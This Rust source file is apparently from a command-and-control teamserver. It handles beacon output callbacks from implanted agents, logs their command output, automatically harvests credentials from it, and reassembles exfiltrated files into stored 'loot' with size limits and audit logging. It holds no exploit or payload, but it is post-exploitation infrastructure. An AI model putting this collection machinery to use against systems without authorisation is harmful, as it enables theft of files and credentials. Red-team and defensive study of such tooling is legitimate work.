//! Handler for the `BeaconOutput` command callback, covering the
//! `Output`/`OutputOem`/`OutputUtf8`/`ErrorMessage` text branches as well as
//! the `File`/`FileWrite`/`FileClose` transfer state machine.

use std::collections::BTreeMap;

use red_cell_common::demon::{DemonCallback, DemonCommand};
use serde_json::Value;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tracing::warn;

use super::super::filesystem::{
    download_complete_event, download_progress_event, parse_file_chunk, parse_file_close,
    parse_file_open_header, persist_download,
};
use super::super::{
    AgentResponseEntry, CallbackParser, CommandDispatchError, DownloadState, DownloadTracker,
    agent_response_event, broadcast_and_persist_agent_response, loot_context, loot_new_event,
    persist_credentials_from_output,
};
use crate::{
    AgentRegistry, AuditResultStatus, Database, EventBus, PluginRuntime, audit_details,
    parameter_object, record_operator_action,
};

pub(in crate::dispatch) async fn handle_beacon_output(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    downloads: &DownloadTracker,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::BeaconOutput));
    let callback = parser.read_u32("beacon callback type")?;
    let context = loot_context(registry, agent_id, request_id).await;

    match DemonCallback::try_from(callback).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::BeaconOutput),
            message: error.to_string(),
        }
    })? {
        DemonCallback::Output => {
            let output = parser.read_string("beacon output text")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Good".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::OutputOem | DemonCallback::OutputUtf8 => {
            let output = parser.read_utf16("beacon output utf16")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Good".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::ErrorMessage => {
            let output = parser.read_string("beacon error text")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Error".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::File => {
            let bytes = parser.read_bytes("beacon file open")?;
            let (file_id, expected_size, remote_path) =
                parse_file_open_header(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
            match downloads
                .start(
                    agent_id,
                    file_id,
                    DownloadState {
                        request_id,
                        remote_path: remote_path.clone(),
                        expected_size,
                        data: Vec::new(),
                        started_at,
                    },
                )
                .await
            {
                Ok(()) => {
                    events.broadcast(download_progress_event(
                        agent_id,
                        u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        file_id,
                        &remote_path,
                        0,
                        expected_size,
                        "Started",
                    )?);
                }
                Err(
                    ref error @ CommandDispatchError::DownloadConcurrentLimitExceeded {
                        max_concurrent,
                        ..
                    },
                ) => {
                    let msg = format!(
                        "download rejected: concurrent limit exceeded \
                         (file=0x{file_id:08x}, path={remote_path}, limit={max_concurrent})"
                    );
                    warn!(
                        agent_id = format_args!("{agent_id:08X}"),
                        file_id = format_args!("{file_id:08X}"),
                        %remote_path,
                        max_concurrent,
                        "download rejected: per-agent concurrent download limit exceeded"
                    );
                    if let Err(audit_error) = record_operator_action(
                        database,
                        "teamserver",
                        "download.rejected",
                        "agent",
                        Some(format!("{agent_id:08X}")),
                        audit_details(
                            AuditResultStatus::Failure,
                            Some(agent_id),
                            Some("download"),
                            Some(parameter_object([
                                ("limit_type", Value::String("concurrent".to_owned())),
                                ("file_id", Value::String(format!("{file_id:08X}"))),
                                ("file_path", Value::String(remote_path.clone())),
                                ("max_concurrent", Value::Number(max_concurrent.into())),
                                ("error", Value::String(error.to_string())),
                            ])),
                        ),
                    )
                    .await
                    {
                        warn!(
                            agent_id = format_args!("{agent_id:08X}"),
                            %audit_error,
                            "failed to persist download.rejected audit entry"
                        );
                    }
                    events.broadcast(agent_response_event(
                        agent_id,
                        u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        "Error",
                        &msg,
                        None,
                    )?);
                }
                Err(error) => return Err(error),
            }
        }
        DemonCallback::FileWrite => {
            let bytes = parser.read_bytes("beacon file write")?;
            let (file_id, chunk) = parse_file_chunk(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            match downloads.append(agent_id, file_id, &chunk).await {
                Ok(state) => {
                    events.broadcast(download_progress_event(
                        agent_id,
                        u32::from(DemonCommand::BeaconOutput),
                        state.request_id,
                        file_id,
                        &state.remote_path,
                        state.data.len() as u64,
                        state.expected_size,
                        "InProgress",
                    )?);
                }
                Err(
                    ref error @ (CommandDispatchError::DownloadTooLarge {
                        max_download_bytes, ..
                    }
                    | CommandDispatchError::DownloadAggregateTooLarge {
                        max_total_download_bytes: max_download_bytes,
                        ..
                    }),
                ) => {
                    let limit_type =
                        if matches!(error, CommandDispatchError::DownloadTooLarge { .. }) {
                            "per_download"
                        } else {
                            "aggregate"
                        };
                    let msg = format!(
                        "download rejected: size limit exceeded \
                         (file=0x{file_id:08x}, limit_type={limit_type}, \
                         max_bytes={max_download_bytes})"
                    );
                    warn!(
                        agent_id = format_args!("{agent_id:08X}"),
                        file_id = format_args!("{file_id:08X}"),
                        limit_type,
                        max_download_bytes,
                        "download rejected: download size limit exceeded"
                    );
                    if let Err(audit_error) = record_operator_action(
                        database,
                        "teamserver",
                        "download.rejected",
                        "agent",
                        Some(format!("{agent_id:08X}")),
                        audit_details(
                            AuditResultStatus::Failure,
                            Some(agent_id),
                            Some("download"),
                            Some(parameter_object([
                                ("limit_type", Value::String(limit_type.to_owned())),
                                ("file_id", Value::String(format!("{file_id:08X}"))),
                                ("max_bytes", Value::Number(max_download_bytes.into())),
                                ("error", Value::String(error.to_string())),
                            ])),
                        ),
                    )
                    .await
                    {
                        warn!(
                            agent_id = format_args!("{agent_id:08X}"),
                            %audit_error,
                            "failed to persist download.rejected audit entry"
                        );
                    }
                    events.broadcast(agent_response_event(
                        agent_id,
                        u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        "Error",
                        &msg,
                        None,
                    )?);
                }
                Err(error) => return Err(error),
            }
        }
        DemonCallback::FileClose => {
            let bytes = parser.read_bytes("beacon file close")?;
            let file_id = parse_file_close(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            if let Some(state) = downloads.finish(agent_id, file_id).await {
                let record =
                    persist_download(database, agent_id, file_id, &state, &context).await?;
                events.broadcast(loot_new_event(
                    &record,
                    u32::from(DemonCommand::BeaconOutput),
                    state.request_id,
                    &context,
                )?);
                events.broadcast(download_complete_event(
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    state.request_id,
                    file_id,
                    &state,
                )?);
                if let Some(plugins) = plugins
                    && let Err(error) = plugins.emit_loot_captured(&record).await
                {
                    warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
                }
            }
        }
    }

    Ok(None)
}
